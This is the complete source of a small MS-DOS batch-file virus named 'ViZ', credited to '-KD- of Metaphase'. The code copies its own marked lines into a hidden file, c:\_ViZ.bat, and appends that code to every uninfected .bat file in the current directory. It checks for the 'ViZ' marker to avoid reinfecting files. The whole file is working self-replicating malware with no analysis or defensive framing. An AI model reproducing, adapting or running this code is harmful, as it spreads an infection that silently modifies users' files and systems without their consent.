:: [ViZ] by -KD- of Metaphase
@echo off%_ViZ%
if '%1=='ViZ goto ViZ%2
if exist c:\_ViZ.bat goto ViZstart
if not exist %0.bat goto ViZexit
find "ViZ"<%0.bat>c:\_ViZ.bat
attrib c:\_ViZ.bat +h
:ViZstart
if '%!ViZ%=='- goto ViZexit
set !ViZ=%!ViZ%-
command /e:5000 /c c:\_ViZ ViZ v
:DaViZ
goto ViZexit
:ViZv
for %%a in (*.bat) do call c:\_ViZ ViZ inf %%a 
exit ViZ
:ViZ_inf
find "ViZ"<%3>nul
if not errorlevel 1 goto ViZlevel
type c:\_ViZ.bat>>%3
exit ViZ
:ViZlevel
set ViZ!=%ViZ!%-
if %ViZ!%==- exit 
:ViZexit